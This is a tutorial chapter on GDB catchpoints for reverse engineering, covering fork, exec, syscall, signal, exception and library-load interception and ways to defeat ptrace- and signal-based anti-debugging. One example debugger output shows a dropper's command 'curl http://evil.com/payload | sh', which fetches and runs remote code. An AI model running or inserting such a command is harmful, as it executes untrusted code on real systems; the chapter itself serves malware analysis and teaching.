🔝 Back to [Table of Contents](/TABLE-OF-CONTENTS.md)

# 11.6 — Catchpoints: intercepting `fork`, `exec`, `syscall`, signals

> **Chapter 11 — Debugging with GDB**  
> **Part III — Dynamic Analysis**

---

## A third type of breakpoint

Breakpoints monitor the execution of an instruction at a given address. Watchpoints monitor modifications to a memory zone. **Catchpoints** monitor a third type of event: the **program's interactions with the operating system** — process creation, program loading, system calls, signal reception, C++ exception throwing.

In reverse engineering, catchpoints answer questions that neither breakpoints nor watchpoints cover efficiently:

- "Does this binary fork a child process to escape the debugger?"  
- "What program is executed by this `execve` call?"  
- "Which syscall is used to open this file — `open` or `openat`?"  
- "Does this process receive signals to synchronize its threads?"  
- "Where exactly is this C++ exception thrown?"

Catchpoints intercept these events at the precise moment they occur, before the kernel processes them, allowing you to inspect the program's complete state at that instant.

## Catchpoints on `fork` and `vfork`

### Why monitor `fork`

A number of anti-debugging techniques rely on `fork`. The classic scenario: the program calls `fork()`, the parent process attaches itself as a "debugger" of the child process via `ptrace(PTRACE_TRACEME)`, preventing any external debugger from attaching (a process can only have one tracer). Other binaries use `fork` to isolate their sensitive logic in a child process, making analysis more complex.

Detecting and intercepting these `fork`s is therefore essential.

### Setting a catchpoint on `fork`

```
(gdb) catch fork
Catchpoint 1 (fork)
(gdb) run
...
Catchpoint 1 (forked process 23456), 0x00007ffff7ea1234 in __libc_fork ()
```

GDB stops at the moment of the `fork`, before the child process starts executing. You can inspect the parent's complete state and the new child process's PID.

For `vfork` (variant where the parent is suspended until the child calls `exec` or `_exit`):

```
(gdb) catch vfork
Catchpoint 2 (vfork)
```

### Following parent or child after a `fork`

By default, GDB continues debugging the **parent** process after a `fork`. The child process runs freely without control. This behavior is configurable:

```
(gdb) set follow-fork-mode child
```

With this setting, GDB releases the parent and attaches to the child process after the `fork`. The possible options:

| Mode | Behavior |  
|---|---|  
| `parent` (default) | GDB stays attached to the parent, child runs freely |  
| `child` | GDB attaches to the child, parent runs freely |

To debug **both** processes simultaneously:

```
(gdb) set detach-on-fork off
```

With this setting, GDB keeps control over both processes. The non-followed process is suspended. You can switch between them:

```
(gdb) info inferiors
  Num  Description       Connection  Executable
* 1    process 23455     1 (native)  ./dropper
  2    process 23456     1 (native)  ./dropper

(gdb) inferior 2         # Switch to the child process
[Switching to inferior 2 [process 23456] (./dropper)]
```

The **inferior** concept in GDB represents a debugged process. Each `fork` creates a new inferior. You can set breakpoints, inspect memory, and advance in each inferior independently.

> 💡 **In malware RE:** droppers and some ransomware frequently use `fork` + `exec` to launch their payload. The typical workflow is: `catch fork` → identify the child PID → `set follow-fork-mode child` → rerun → debug the payload directly. This is exactly what we'll do in Chapter 28.

## Catchpoints on `exec`

### Intercepting the loading of a new program

The `execve` system call replaces the current process's image with a new program. It's the step that generally follows a `fork` in the `fork` + `exec` pattern.

```
(gdb) catch exec
Catchpoint 3 (exec)
(gdb) run
...
Catchpoint 3 (exec'd /usr/bin/sh), process 23456
```

GDB stops just after the kernel loaded the new program but before it starts executing. The message indicates the loaded program's path (`/usr/bin/sh` in this example). You can inspect:

```
(gdb) info proc exe
process 23456
/usr/bin/sh

(gdb) info proc mappings    # See the new memory layout
```

It's a pivotal moment in RE: you see exactly which binary is executed and with which arguments. If the analyzed binary launches a shell script or a second executable, the `exec` catchpoint reveals it unambiguously.

### Capturing `execve` arguments

To know the arguments passed to the new program, it's often more direct to set a breakpoint on the `execve` function (or `execvp`, `execl`, etc.) rather than a catchpoint, because the breakpoint stops **before** the call and allows inspecting arguments:

```
(gdb) break execve
Breakpoint 4 at 0x7ffff7ea5678
(gdb) run
...
Breakpoint 4, __execve (path=0x7fffffffe200 "/usr/bin/sh",
    argv=0x7fffffffe100, envp=0x7fffffffe120)

(gdb) x/s *(char **)($rsi)           # argv[0]
0x7fffffffe200: "/usr/bin/sh"
(gdb) x/s *(char **)($rsi + 8)       # argv[1]
0x7fffffffe210: "-c"
(gdb) x/s *(char **)($rsi + 16)      # argv[2]
0x7fffffffe220: "curl http://evil.com/payload | sh"
```

The advantage of the `exec` catchpoint, on the other hand, is that it works even when the program directly uses the `execve` syscall without going through libc (a common evasion technique in malware).

## Catchpoints on system calls: `catch syscall`

### Why intercept syscalls

`strace` (seen in Chapter 5) is the standard tool for tracing system calls, but it has limitations in an RE context:

- It traces **all** syscalls, without fine-grained filtering.  
- It doesn't allow inspecting memory or registers at the time of the call.  
- It doesn't allow modifying a syscall's arguments or return value.  
- Some binaries detect `strace` (via `ptrace`) and change behavior.

Syscall catchpoints in GDB solve all four limitations. You intercept specific syscalls, inspect the process's complete state, can modify registers before the syscall executes, and GDB already uses `ptrace` — no additional tracer to detect.

### Basic syntax

```
(gdb) catch syscall
Catchpoint 5 (any syscall)
```

Without an argument, GDB stops on **every** system call — it's the equivalent of `strace` but interactive. In practice, it's far too verbose. Filter by name or number:

```
(gdb) catch syscall open
Catchpoint 6 (syscall 'open' [2])

(gdb) catch syscall openat
Catchpoint 7 (syscall 'openat' [257])

(gdb) catch syscall write
Catchpoint 8 (syscall 'write' [1])
```

You can specify multiple syscalls in a single command:

```
(gdb) catch syscall open openat read write close
Catchpoint 9 (syscalls 'open' [2] 'openat' [257] 'read' [0] 'write' [1] 'close' [3])
```

Or use the number directly (useful when GDB doesn't know the name):

```
(gdb) catch syscall 59         # execve (number 59 on x86-64)
```

### Syscall entry and exit

A syscall catchpoint triggers **twice** for each call: once at **entry** (before the kernel processes the call) and once at **exit** (when the kernel returns control to the process). GDB clearly indicates the phase:

```
Catchpoint 6 (call to syscall open), 0x00007ffff7eb1234 in __open64 ()
```

This is the entry — the syscall is about to be executed. Arguments are in registers:

```
(gdb) print/x $rdi             # 1st arg: pathname
(gdb) x/s $rdi
0x402030: "/etc/passwd"
(gdb) print/x $rsi             # 2nd arg: flags
$1 = 0x0                       # O_RDONLY
(gdb) continue

Catchpoint 6 (returned from syscall open), 0x00007ffff7eb1238 in __open64 ()
```

This is the exit — the syscall is complete. The return value is in `rax`:

```
(gdb) print $rax
$2 = 3                         # File descriptor 3 — successful open
```

If you only care about entry or exit, combine with `commands`:

```
(gdb) catch syscall write
Catchpoint 10 (syscall 'write' [1])
(gdb) commands 10
  silent
  # We're at entry OR exit — we filter
  if $rax == -38
    # At syscall entry, rax contains -ENOSYS (= -38) on some kernels
    # In practice, identify entry by argument content
    printf "write(fd=%d, buf=%p, len=%d)\n", (int)$rdi, $rsi, (int)$rdx
    x/s $rsi
  end
  continue
end
```

> 💡 **Tip:** to reliably distinguish entry from exit, you can use GDB's Python API. Section 11.8 will show how to write a Python handler exploiting `gdb.events.stop` to identify the catchpoint phase.

### Useful syscalls to monitor in RE

| Syscall | Number (x86-64) | RE interest |  
|---|---|---|  
| `open` / `openat` | 2 / 257 | Files accessed (config, payloads, target files) |  
| `read` / `write` | 0 / 1 | Data read and written (file content, network I/O) |  
| `connect` | 42 | Outgoing network connections (C2, exfiltration) |  
| `socket` | 41 | Socket creation (protocol, type) |  
| `mmap` / `mprotect` | 9 / 10 | Executable memory allocation (code decompression, JIT) |  
| `execve` | 59 | Execution of a new program |  
| `clone` / `fork` | 56 / 57 | Process/thread creation |  
| `ptrace` | 101 | Anti-debugging (binary tries to trace itself) |  
| `unlink` | 87 | File deletion (trace cleanup) |  
| `kill` | 62 | Signal sending (inter-process communication) |

The `ptrace` catchpoint is particularly valuable: many binaries call `ptrace(PTRACE_TRACEME)` as an anti-debugging technique. By intercepting this call, you can modify `rax` to simulate success (return 0) and neutralize the protection:

```
(gdb) catch syscall ptrace
Catchpoint 11 (syscall 'ptrace' [101])
(gdb) commands 11
  silent
  # At syscall exit, force return to 0 (success)
  set $rax = 0
  continue
end
```

The `mprotect` catchpoint reveals moments when a binary makes a memory zone executable — it's the signal of unpacking or in-memory code decryption (Chapter 29).

## Signal handling: `handle`

Unix signals are a communication mechanism between the kernel (or other processes) and the debugged process. By default, GDB intercepts some signals and ignores others. The `handle` command configures this behavior.

### Default behavior

To see the current policy for all signals:

```
(gdb) info signals
Signal        Stop   Print  Pass to program  Description  
SIGHUP        Yes    Yes    Yes              Hangup  
SIGINT        Yes    Yes    No               Interrupt  
SIGQUIT       Yes    Yes    Yes              Quit  
SIGILL        Yes    Yes    Yes              Illegal instruction  
SIGTRAP       Yes    Yes    No               Trace/breakpoint trap  
SIGABRT       Yes    Yes    Yes              Aborted  
SIGFPE        Yes    Yes    Yes              Floating point exception  
SIGKILL       Yes    Yes    Yes              Killed  
SIGSEGV       Yes    Yes    Yes              Segmentation fault  
SIGPIPE       Yes    Yes    Yes              Broken pipe  
SIGALRM       No     No     Yes              Alarm clock  
SIGUSR1       Yes    Yes    Yes              User defined signal 1  
SIGUSR2       Yes    Yes    Yes              User defined signal 2  
...
```

The three configuration columns:

| Column | Meaning |  
|---|---|  
| **Stop** | GDB stops execution when the signal is received |  
| **Print** | GDB displays a message when the signal is received |  
| **Pass** | GDB transmits the signal to the program (otherwise it absorbs it) |

### Configuring signal handling

```
(gdb) handle SIGALRM stop print nopass
```

With this configuration, when the program receives `SIGALRM`: GDB stops execution (`stop`), displays a message (`print`), but does **not** transmit the signal to the program (`nopass`). The program never knows the alarm rang.

Possible options:

| Option | Effect |  
|---|---|  
| `stop` / `nostop` | Stop / don't stop execution |  
| `print` / `noprint` | Display / don't display a message |  
| `pass` / `nopass` | Transmit / don't transmit to the program |

Common configurations in RE:

```
# Ignore SIGALRM (often used for anti-debug timeouts)
(gdb) handle SIGALRM noprint nostop pass

# Intercept SIGUSR1 (sometimes used for inter-process communication)
(gdb) handle SIGUSR1 stop print nopass

# Intercept SIGSEGV to analyze a crash without the program terminating
(gdb) handle SIGSEGV stop print nopass
```

### Signal catchpoints

In addition to `handle`, you can set a catchpoint on signal reception:

```
(gdb) catch signal SIGSEGV
Catchpoint 12 (signal SIGSEGV)
```

The difference with `handle SIGSEGV stop` is subtle but important: the catchpoint is a true breakpoint that appears in `info breakpoints`, can have a condition, and can be associated with a `commands` block. It's also independently deletable from other signal settings.

```
(gdb) catch signal SIGUSR1
Catchpoint 13 (signal SIGUSR1)
(gdb) commands 13
  silent
  printf "SIGUSR1 received, rip=%p\n", $rip
  backtrace 3
  continue
end
```

This catchpoint logs each `SIGUSR1` reception with the call stack, without interrupting execution.

### Signals and anti-debugging

Some anti-debugging techniques exploit signals:

**Timing via `SIGALRM`.** The program arms an alarm with `alarm(2)`. If the program is debugged (and therefore slowed), the alarm expires before normal processing completes, triggering `SIGALRM` whose handler terminates the program or changes behavior. The countermeasure:

```
(gdb) handle SIGALRM nostop noprint pass
# Or better: prevent the alarm by intercepting the alarm syscall
(gdb) catch syscall alarm
(gdb) commands
  silent
  set $rdi = 0        # alarm(0) cancels the alarm
  continue
end
```

**Self-signaling with `SIGTRAP`.** The program sends itself a `SIGTRAP` (the signal generated by breakpoints). Under a debugger, `SIGTRAP` is intercepted by GDB; without a debugger, the program's signal handler is called. The program detects the difference. The countermeasure:

```
(gdb) handle SIGTRAP nostop pass
```

By passing `SIGTRAP` to the program without stopping, GDB mimics the debugger-less behavior.

## Catchpoints on C++ exceptions

GDB can intercept the throwing (`throw`) and catching (`catch`) of C++ exceptions:

```
(gdb) catch throw
Catchpoint 14 (throw)

(gdb) catch catch
Catchpoint 15 (catch)
```

The `throw` catchpoint stops at the moment an exception is thrown, before the stack is unwound. It's the ideal moment to inspect the program's state — once the exception is caught by a `catch`, intermediate frames have been destroyed.

```
Catchpoint 14 (exception thrown), 0x00007ffff7e8a123 in __cxa_throw ()
(gdb) backtrace
#0  __cxa_throw () from /lib/x86_64-linux-gnu/libstdc++.so.6
#1  0x0000000000401234 in ?? ()          # Code throwing the exception
#2  0x0000000000401456 in ?? ()
#3  0x0000000000401789 in ?? ()
```

You can filter by exception type:

```
(gdb) catch throw std::runtime_error
```

GDB will only stop for `std::runtime_error` exceptions. This requires RTTI information to be present in the binary (which is the case by default in C++ with GCC, unless `-fno-rtti` was used).

In C++ binary RE, exception catchpoints are useful for understanding the control flow of programs that use exceptions as an error-handling mechanism: rather than returning an error code, the program throws an exception, and the catchpoint lets you see exactly where and why.

## Catchpoints on library loading

GDB can stop when a shared library is loaded or unloaded dynamically:

```
(gdb) catch load
Catchpoint 16 (load)

(gdb) catch load libcrypto
Catchpoint 17 (load libcrypto)

(gdb) catch unload
Catchpoint 18 (unload)
```

The `catch load` catchpoint without an argument stops on loading of **any** library. With a name, it filters by library name (partial match).

It's particularly useful when a binary uses `dlopen` to load plugins or libraries on demand:

```
Catchpoint 17 (loaded libcrypto.so.3), ...
(gdb) info sharedlibrary
From                To                  Syms Read  Shared Object Library
0x00007ffff7fc0000  0x00007ffff7fd2000  Yes         /lib64/ld-linux-x86-64.so.2
0x00007ffff7dc0000  0x00007ffff7f5d000  Yes         /lib/x86_64-linux-gnu/libc.so.6
0x00007ffff7a00000  0x00007ffff7c50000  Yes         /lib/x86_64-linux-gnu/libcrypto.so.3
```

You can then set breakpoints on the newly loaded library's functions. It's the standard workflow for analyzing a binary that loads its encryption routines dynamically (Chapter 24) or a plugin system (Chapter 22).

## Listing and managing catchpoints

Catchpoints appear in the shared list with breakpoints and watchpoints:

```
(gdb) info breakpoints
Num  Type        Disp Enb Address            What
1    catchpoint  keep y                      fork
3    catchpoint  keep y                      exec
6    catchpoint  keep y                      syscall "open" [2]
12   catchpoint  keep y                      signal "SIGSEGV"
14   catchpoint  keep y                      exception throw
17   catchpoint  keep y                      load of library matching "libcrypto"
```

All the usual management commands apply:

```
(gdb) disable 6          # Disable the syscall open catchpoint
(gdb) enable 6           # Re-enable
(gdb) delete 12          # Delete the signal SIGSEGV catchpoint
(gdb) condition 6 $rdi != 0    # Add a condition
```

## Commands summary

| Command | Intercepted event |  
|---|---|  
| `catch fork` | Call to `fork()` |  
| `catch vfork` | Call to `vfork()` |  
| `catch exec` | Call to `execve()` (loading a new program) |  
| `catch syscall [name\|num]` | Specific system call(s) or all |  
| `catch signal [SIG]` | Signal reception |  
| `catch throw [type]` | Throwing a C++ exception |  
| `catch catch [type]` | Catching a C++ exception |  
| `catch load [lib]` | Loading a shared library |  
| `catch unload [lib]` | Unloading a shared library |  
| `set follow-fork-mode child\|parent` | Choose which process to follow after a fork |  
| `set detach-on-fork off` | Keep control over both processes |  
| `handle SIG [no]stop [no]print [no]pass` | Configure signal handling |

---

> **Takeaway:** Catchpoints intercept system events that neither breakpoints nor watchpoints cover: process creation, program execution, individual system calls, signals, and exceptions. In RE, they are indispensable for analyzing multi-process binaries (`fork` + `exec`), tracing file and network access at the syscall level, neutralizing anti-debugging techniques based on `ptrace` or signals, and understanding dynamic library loading. Combined with `commands` blocks, they become non-intrusive system probes that log the binary's interactions with the kernel.

⏭️ [Remote debugging with `gdbserver` (debugging on a remote target)](/11-gdb/07-remote-debugging-gdbserver.md)
